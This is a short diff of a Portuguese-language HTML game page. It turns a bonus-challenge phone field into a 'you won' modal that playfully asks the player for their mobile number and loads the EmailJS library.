@@ -18,12 +18,18 @@
         <div class="message" id="message"></div>
     </div>
 
-    <div class="phone-container" id="phoneContainer">
-        <h2>Desafio Bônus</h2>
-        <p>Dica: Número de uma gatinha que tá jogando!</p>
-        <input type="text" id="phone" class="phone-input" placeholder="Ex: 11948519420" />
-        <button class="submit-btn" onclick="submitPhone()">Enviar Número</button>
+   <!-- Modal -->
+<div id="phoneModal" class="modal">
+    <div class="modal-content">
+      <span class="close-btn" onclick="closeModal()">&times;</span>
+      <h2>Parabéns, você ganhou!</h2>
+      <p>Digite seu número de celular para receber o prêmio</p>
+      <br>
+      <p>Dica: É o número de uma gatinha que está jogando! 😉</p>
+      <input type="text" id="phoneInput" class="phone-input" placeholder="Ex: 11912345678" />
+      <button class="submit-btn" onclick="submitPhone()">Enviar Número</button>
     </div>
+  </div>
 
     <!-- Carregar o EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
